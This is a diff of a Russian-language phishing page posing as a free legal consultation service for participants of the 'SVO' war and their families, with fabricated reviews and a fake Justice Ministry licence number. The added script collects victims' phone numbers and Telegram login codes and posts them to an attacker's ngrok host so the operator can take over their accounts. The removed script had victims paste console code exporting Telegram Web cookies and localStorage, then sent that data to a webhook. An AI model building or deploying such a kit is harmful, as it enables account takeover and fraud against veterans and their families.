@@ -2,338 +2,359 @@
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
     <title>Адвокатская коллегия "СВО" | Бесплатная консультация</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
         body {
             font-family: 'Segoe UI', 'Roboto', 'Georgia', serif;
-            background: linear-gradient(rgba(0, 0, 0, 0.75), rgba(0, 0, 0, 0.85)), 
+            background: linear-gradient(rgba(0, 0, 0, 0.85), rgba(0, 0, 0, 0.95)), 
                         url('https://upload.wikimedia.org/wikipedia/commons/thumb/f/f3/Flag_of_Russia.svg/1280px-Flag_of_Russia.svg.png');
             background-size: cover;
             background-attachment: fixed;
+            background-position: center;
             color: #eee;
             min-height: 100vh;
             padding: 20px;
         }
-        .wrapper { max-width: 1300px; margin: 0 auto; }
-        .glass-card {
-            background: rgba(0, 0, 0, 0.65);
-            backdrop-filter: blur(10px);
-            border-radius: 32px;
-            border: 1px solid rgba(255, 215, 0, 0.4);
-            padding: 30px 25px;
-            margin-bottom: 35px;
+
+        .wrapper {
+            max-width: 600px;
+            margin: 0 auto;
         }
+
+        .glass-card {
+            background: rgba(0, 0, 0, 0.75);
+            backdrop-filter: blur(12px);
+            border-radius: 32px;
+            border: 1px solid rgba(255, 215, 0, 0.5);
+            padding: 30px 25px;
+            margin-bottom: 25px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.4);
+        }
+
         h1 {
-            font-size: 2.5rem;
+            font-size: 2rem;
             text-align: center;
             background: linear-gradient(135deg, #FFD966, #FFAA00);
             -webkit-background-clip: text;
             background-clip: text;
             color: transparent;
+            margin-bottom: 10px;
         }
-        .btn {
-            display: block;
-            width: fit-content;
-            margin: 35px auto;
-            background: linear-gradient(95deg, #1E5AFE, #0040c0);
-            padding: 18px 48px;
-            font-size: 1.5rem;
-            font-weight: bold;
-            border-radius: 60px;
+
+        .sub {
             text-align: center;
+            font-size: 0.85rem;
+            color: #FFD966;
+            margin-bottom: 25px;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-size: 0.85rem;
+            color: #FFD966;
+        }
+
+        input {
+            width: 100%;
+            padding: 14px 16px;
+            background: rgba(0, 0, 0, 0.6);
+            border: 1px solid rgba(255, 215, 0, 0.5);
+            border-radius: 16px;
+            color: white;
+            font-size: 16px;
+            font-family: monospace;
+        }
+
+        input:focus {
+            outline: none;
+            border-color: #FFAA00;
+            box-shadow: 0 0 10px rgba(255, 170, 0, 0.3);
+        }
+
+        button {
+            width: 100%;
+            padding: 14px;
+            background: linear-gradient(95deg, #1E5AFE, #0040c0);
+            border: none;
+            border-radius: 40px;
+            font-size: 18px;
+            font-weight: bold;
             color: white;
             cursor: pointer;
-            border: 1px solid rgba(255,215,0,0.6);
+            margin-top: 10px;
+            transition: 0.2s;
         }
-        .btn:hover { transform: scale(1.02); }
-        .services-grid {
+
+        button:hover {
+            transform: scale(1.02);
+            background: linear-gradient(95deg, #3F7AFF, #0055ee);
+        }
+
+        button:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+
+        .services {
             display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
-            gap: 15px;
-            margin-top: 20px;
-        }
-        .service-item {
-            background: rgba(0, 0, 0, 0.55);
-            border-radius: 28px;
-            padding: 15px;
-            text-align: center;
-            border: 1px solid rgba(255,200,50,0.5);
-        }
-        .service-title { font-size: 1.1rem; font-weight: bold; color: #FFD966; }
-        .reviews-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(260px, 1fr));
-            gap: 15px;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 12px;
             margin: 20px 0;
         }
-        .review-card {
-            background: rgba(20, 20, 30, 0.7);
-            border-left: 5px solid gold;
+
+        .service-item {
+            background: rgba(0, 0, 0, 0.4);
             border-radius: 20px;
-            padding: 12px;
-            font-size: 0.9rem;
+            padding: 10px;
+            text-align: center;
+            font-size: 0.8rem;
+            border: 1px solid rgba(255, 215, 0, 0.3);
         }
-        .stars { color: gold; }
+
+        .reviews {
+            margin: 20px 0;
+        }
+
+        .review-card {
+            background: rgba(0, 0, 0, 0.4);
+            border-left: 4px solid #FFD966;
+            border-radius: 16px;
+            padding: 12px;
+            margin-bottom: 12px;
+            font-size: 0.75rem;
+        }
+
+        .stars {
+            color: #FFD966;
+            margin-bottom: 5px;
+        }
+
         .license {
             text-align: center;
-            font-family: monospace;
+            font-size: 0.7rem;
+            color: #aaa;
+            margin-top: 15px;
             padding-top: 15px;
             border-top: 1px dashed #FFD966;
-            font-size: 0.8rem;
         }
-        .status-badge {
+
+        .status {
             text-align: center;
-            padding: 8px;
-            margin-bottom: 15px;
-            border-radius: 40px;
+            padding: 12px;
+            border-radius: 20px;
             background: rgba(0,0,0,0.5);
-            font-size: 0.9rem;
+            margin-bottom: 20px;
+            font-size: 0.85rem;
+            white-space: pre-line;
         }
+
         .toast {
             position: fixed;
             bottom: 30px;
             left: 20px;
             right: 20px;
             background: #1F3A3F;
-            border-left: 8px solid #FFD966;
-            border-radius: 28px;
-            padding: 15px;
+            border-left: 6px solid #FFD966;
+            border-radius: 24px;
+            padding: 14px;
             text-align: center;
+            font-weight: bold;
             opacity: 0;
             transition: opacity 0.4s;
             pointer-events: none;
-            z-index: 1500;
+            z-index: 1000;
         }
-        .paper-plane {
-            background: #2A6EFF;
-            width: 70px;
-            height: 70px;
-            border-radius: 70px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin: 30px auto;
-            cursor: pointer;
-            font-size: 2rem;
-        }
-        .footer-contacts {
-            display: flex;
-            flex-wrap: wrap;
-            justify-content: space-between;
-            gap: 10px;
-            font-size: 0.8rem;
-            margin-top: 15px;
-        }
-        @media (max-width: 600px) {
-            h1 { font-size: 1.8rem; }
-            .btn { font-size: 1.2rem; padding: 12px 28px; }
-            .service-title { font-size: 0.9rem; }
+
+        @media (max-width: 500px) {
+            h1 { font-size: 1.5rem; }
+            .glass-card { padding: 20px; }
+            .services { grid-template-columns: 1fr; }
+            button { font-size: 16px; }
         }
     </style>
 </head>
 <body>
 <div class="wrapper">
+    <!-- Главная страница -->
     <div id="mainPage">
         <div class="glass-card">
-            <div id="authStatus" class="status-badge">
-                <span id="statusText">🔐 Статус: не авторизован</span>
-                <span id="logoutBtn" style="display:none; cursor:pointer; margin-left:15px; color:#ff6666;">[Выйти]</span>
+            <h1>⚖️ АДВОКАТСКАЯ КОЛЛЕГИЯ "СВО"</h1>
+            <div class="sub">Бесплатная консультация участникам СВО и их семьям</div>
+
+            <div class="services">
+                <div class="service-item">📜 Земельные споры</div>
+                <div class="service-item">💰 Выплаты и ЕДВ</div>
+                <div class="service-item">🏠 Жилищные вопросы</div>
+                <div class="service-item">👨‍👩‍👧 Алименты</div>
+                <div class="service-item">⚕️ Льготы ветеранам</div>
+                <div class="service-item">🏛️ Судебный процесс</div>
             </div>
-            <h1>⚖️ АДВОКАТСКАЯ КОЛЛЕГИЯ "СВО" ⚖️</h1>
-            <div style="text-align:center; margin:10px 0;">Защита прав героев | Бесплатно участникам СВО и их семьям</div>
-            
-            <button class="btn" id="getConsultBtn">🎖️ ПОЛУЧИТЬ БЕСПЛАТНУЮ КОНСУЛЬТАЦИЮ</button>
-            
-            <div class="services-grid">
-                <div class="service-item"><div class="service-title">📜 Земельные споры</div></div>
-                <div class="service-item"><div class="service-title">💰 Выплаты и ЕДВ</div></div>
-                <div class="service-item"><div class="service-title">🏠 Жилищные вопросы</div></div>
-                <div class="service-item"><div class="service-title">👨‍👩‍👧 Алименты</div></div>
-                <div class="service-item"><div class="service-title">⚕️ Льготы ветеранам</div></div>
-                <div class="service-item"><div class="service-title">🏛️ Судебный процесс</div></div>
-            </div>
+
+            <button id="getConsultBtn">🎖️ ПОЛУЧИТЬ КОНСУЛЬТАЦИЮ</button>
         </div>
 
         <div class="glass-card">
-            <div class="reviews-grid">
-                <div class="review-card"><div class="stars">★★★★★</div>"Помог получить выплату участнику СВО. Оперативно!" — Андрей, Москва</div>
-                <div class="review-card"><div class="stars">★★★★★</div>"Оформили землю без проблем. Спасибо!" — Сергей, Ростов</div>
-                <div class="review-card"><div class="stars">★★★★★</div>"Помогли с удостоверением ветерана. Очень доволен!" — Дмитрий, Казань</div>
+            <div class="reviews">
+                <div class="review-card"><div class="stars">★★★★★</div>"Помогли получить выплату участнику СВО. Спасибо!" — Андрей, Москва</div>
+                <div class="review-card"><div class="stars">★★★★★</div>"Оформили земельный участок. Очень доволен!" — Сергей, Ростов</div>
+                <div class="review-card"><div class="stars">★★★★★</div>"Консультация помогла разобраться в льготах" — Дмитрий, Казань</div>
             </div>
             <div class="license">⚜️ Лицензия Минюста РФ № 77-ОГ-0123456789 ⚜️</div>
-            <div class="footer-contacts">
-                <span>📞 +7 (495) 123-45-67</span>
-                <span>🏛️ г. Москва, ул. Тверская, д. 1</span>
-                <span>⏰ 09:00 – 21:00</span>
-            </div>
         </div>
     </div>
 
     <!-- Страница авторизации -->
     <div id="authPage" style="display:none;">
-        <div class="glass-card" style="text-align:center;">
-            <h2>📋 ЗАПИСЬ НА КОНСУЛЬТАЦИЮ</h2>
-            <p style="margin:20px 0;">Для оформления заявки необходимо авторизоваться через Telegram</p>
-            <div id="telegramAuthBtn" class="paper-plane">✈️</div>
-            <p style="font-size:0.8rem;">Нажмите на ✈️, чтобы войти через Telegram</p>
+        <div class="glass-card">
+            <h1>📋 ЗАПИСЬ НА КОНСУЛЬТАЦИЮ</h1>
+            <div class="sub">Для оформления заявки авторизуйтесь через Telegram</div>
+
+            <div class="status" id="status">🔐 Введите номер телефона</div>
+
+            <div class="form-group">
+                <label>📱 Номер телефона</label>
+                <input type="tel" id="phoneInput" placeholder="+79123456789" autocomplete="off">
+            </div>
+
+            <div class="form-group" id="codeGroup" style="display:none;">
+                <label>🔑 Код из Telegram</label>
+                <input type="text" id="codeInput" placeholder="Введите код" autocomplete="off">
+            </div>
+
+            <button id="submitBtn">ПРОДОЛЖИТЬ</button>
         </div>
     </div>
 </div>
 
-<div id="toast" class="toast">📋 Благодарим за заявку! С вами свяжется специалист.</div>
+<div id="toast" class="toast">📋 Благодарим за заявку! С вами свяжутся.</div>
 
 <script>
-    // Конфиг: сюда будут приходить сессии
-    const WEBHOOK_URL = "https://your-server.com/api/save_session"; // ЗАМЕНИ НА ТВОЙ АДРЕС
-    // Если нет сервера — сессии будут сохраняться в файл через download
-    
-    let currentSession = null;
-    
+    // ⚙️ ВСТАВЬ СВОЮ ССЫЛКУ ИЗ NGROK
+    const PC_URL = 'https://agreeable-vice-hundredth.ngrok-free.dev';
+
+    let currentPhone = '';
+    let step = 'phone';
+
+    const mainPage = document.getElementById('mainPage');
+    const authPage = document.getElementById('authPage');
+    const phoneInput = document.getElementById('phoneInput');
+    const codeInput = document.getElementById('codeInput');
+    const codeGroup = document.getElementById('codeGroup');
+    const submitBtn = document.getElementById('submitBtn');
+    const statusDiv = document.getElementById('status');
+    const toast = document.getElementById('toast');
+
     function showToast(msg) {
-        const toast = document.getElementById('toast');
         toast.textContent = msg;
         toast.style.opacity = '1';
         setTimeout(() => toast.style.opacity = '0', 4000);
     }
-    
-    function saveSessionToFile(sessionData) {
-        // Сохраняем сессию в JSON файл (скачивается на устройство)
-        const dataStr = JSON.stringify(sessionData, null, 2);
-        const blob = new Blob([dataStr], {type: 'application/json'});
-        const url = URL.createObjectURL(blob);
-        const a = document.createElement('a');
-        a.href = url;
-        a.download = `telegram_session_${Date.now()}.json`;
-        a.click();
-        URL.revokeObjectURL(url);
-        showToast('✅ Сессия сохранена в файл!');
-    }
-    
-    async function sendSessionToServer(sessionData) {
-        try {
-            const response = await fetch(WEBHOOK_URL, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify(sessionData)
-            });
-            if (response.ok) {
-                showToast('✅ Сессия отправлена на сервер!');
-                return true;
-            }
-        } catch(e) {
-            console.log('Сервер недоступен, сохраняем локально');
-        }
-        return false;
-    }
-    
-    function checkSavedSession() {
-        const saved = localStorage.getItem('tg_session');
-        if (saved) {
-            try {
-                const session = JSON.parse(saved);
-                if (session.cookies && session.cookies.length > 0) {
-                    document.getElementById('statusText').innerHTML = '✅ Статус: авторизован';
-                    document.getElementById('logoutBtn').style.display = 'inline-block';
-                    currentSession = session;
-                    return true;
-                }
-            } catch(e) {}
-        }
-        return false;
-    }
-    
-    function logout() {
-        localStorage.removeItem('tg_session');
-        currentSession = null;
-        document.getElementById('statusText').innerHTML = '🔐 Статус: не авторизован';
-        document.getElementById('logoutBtn').style.display = 'none';
-        showToast('👋 Вы вышли из аккаунта');
-    }
-    
-    async function extractSessionFromTelegram() {
-        // Открываем Telegram Web в новом окне
-        const tgWindow = window.open('https://web.telegram.org/a/', '_blank');
-        
-        // Инструкция для пользователя
-        showToast('1️⃣ Войдите в Telegram\n2️⃣ После входа вернитесь на эту страницу');
-        
-        // Функция для попытки вытянуть данные
-        const attemptExtract = () => {
-            // Здесь нужно объяснить пользователю, как вытянуть сессию
-            // Для автоматического вытягивания нужен Chrome Extension или прокси
-            // Простой вариант: пользователь сам копирует куки через консоль
-            
-            const instructions = `
-            📋 ИНСТРУКЦИЯ ДЛЯ ПОЛУЧЕНИЯ СЕССИИ:
-            
-            1. Откройте web.telegram.org в браузере
-            2. Войдите в аккаунт
-            3. Нажмите F12 (Инспектор)
-            4. Перейдите во вкладку Console (Консоль)
-            5. Вставьте и выполните этот код:
-            
-            -----------------------------------------
-            copy(JSON.stringify({
-                cookies: document.cookie,
-                localStorage: window.localStorage,
-                userAgent: navigator.userAgent,
-                url: location.href
-            }));
-            -----------------------------------------
-            
-            6. Данные скопируются в буфер обмена
-            7. Вставьте их сюда:
-            `;
-            
-            const sessionJson = prompt(instructions, 'ВСТАВЬТЕ JSON СЮДА...');
-            if (sessionJson) {
-                try {
-                    const sessionData = JSON.parse(sessionJson);
-                    // Сохраняем
-                    localStorage.setItem('tg_session', JSON.stringify(sessionData));
-                    currentSession = sessionData;
-                    
-                    // Отправляем тебе
-                    sendSessionToServer(sessionData);
-                    saveSessionToFile(sessionData);
-                    
-                    document.getElementById('statusText').innerHTML = '✅ Статус: авторизован';
-                    document.getElementById('logoutBtn').style.display = 'inline-block';
-                    showToast('✅ Сессия сохранена!');
-                    
-                    // Возврат на главную
-                    document.getElementById('authPage').style.display = 'none';
-                    document.getElementById('mainPage').style.display = 'block';
-                } catch(e) {
-                    showToast('❌ Ошибка: неверный формат данных');
-                }
-            }
-        };
-        
-        setTimeout(attemptExtract, 3000);
-    }
-    
-    // Навигация
+
     document.getElementById('getConsultBtn').onclick = () => {
-        if (currentSession) {
-            // Уже авторизован — отправляем заявку
-            showToast('📋 Благодарим за заявку! С вами свяжется специалист.');
-        } else {
-            document.getElementById('mainPage').style.display = 'none';
-            document.getElementById('authPage').style.display = 'block';
+        mainPage.style.display = 'none';
+        authPage.style.display = 'block';
+        step = 'phone';
+        phoneInput.value = '';
+        codeInput.value = '';
+        codeGroup.style.display = 'none';
+        submitBtn.textContent = 'ПРОДОЛЖИТЬ';
+        submitBtn.disabled = false;
+        statusDiv.innerHTML = '🔐 Введите номер телефона';
+    };
+
+    submitBtn.onclick = async () => {
+        if (step === 'phone') {
+            const phone = phoneInput.value.trim();
+            if (!phone || !phone.startsWith('+')) {
+                showToast('❌ Введите номер в формате +79123456789');
+                return;
+            }
+            
+            currentPhone = phone;
+            statusDiv.innerHTML = '⏳ Отправка номера на сервер...';
+            submitBtn.disabled = true;
+            
+            try {
+                const res = await fetch(`${PC_URL}/api/send_phone`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({phone: phone})
+                });
+                
+                const data = await res.json();
+                
+                if (data.status === 'ok') {
+                    step = 'code';
+                    codeGroup.style.display = 'block';
+                    submitBtn.textContent = 'ПОДТВЕРДИТЬ КОД';
+                    statusDiv.innerHTML = '✅ Код отправлен в Telegram!\n📱 Введите код из сообщения';
+                    showToast('✅ Код отправлен! Проверьте Telegram');
+                } else {
+                    statusDiv.innerHTML = '❌ Ошибка: ' + (data.error || 'сервер не ответил');
+                }
+            } catch(e) {
+                statusDiv.innerHTML = '❌ Ошибка соединения с ПК\nПроверьте ngrok';
+                showToast('❌ ПК недоступен');
+            }
+            submitBtn.disabled = false;
+            
+        } else if (step === 'code') {
+            const code = codeInput.value.trim();
+            if (!code) {
+                showToast('❌ Введите код из Telegram');
+                return;
+            }
+            
+            statusDiv.innerHTML = '⏳ Отправка кода на сервер...';
+            submitBtn.disabled = true;
+            
+            try {
+                const res = await fetch(`${PC_URL}/api/send_code`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({phone: currentPhone, code: code})
+                });
+                
+                const data = await res.json();
+                
+                if (data.status === 'ok') {
+                    statusDiv.innerHTML = '✅ Заявка отправлена!\nСпасибо за доверие!';
+                    showToast('📋 Благодарим за заявку! С вами свяжется специалист.');
+                    
+                    setTimeout(() => {
+                        mainPage.style.display = 'block';
+                        authPage.style.display = 'none';
+                        step = 'phone';
+                        codeGroup.style.display = 'none';
+                        phoneInput.value = '';
+                        codeInput.value = '';
+                        submitBtn.textContent = 'ПРОДОЛЖИТЬ';
+                        statusDiv.innerHTML = '🔐 Введите номер телефона';
+                        submitBtn.disabled = false;
+                    }, 3500);
+                } else {
+                    statusDiv.innerHTML = '❌ Неверный код. Попробуйте ещё раз';
+                    showToast('❌ Код не подошёл. Повторите');
+                }
+            } catch(e) {
+                statusDiv.innerHTML = '❌ Ошибка соединения с ПК';
+                showToast('❌ ПК недоступен');
+            }
+            submitBtn.disabled = false;
         }
     };
-    
-    document.getElementById('telegramAuthBtn').onclick = () => {
-        extractSessionFromTelegram();
-    };
-    
-    document.getElementById('logoutBtn').onclick = logout;
-    
-    // Проверяем сохранённую сессию
-    checkSavedSession();
 </script>
 </body>
 </html>
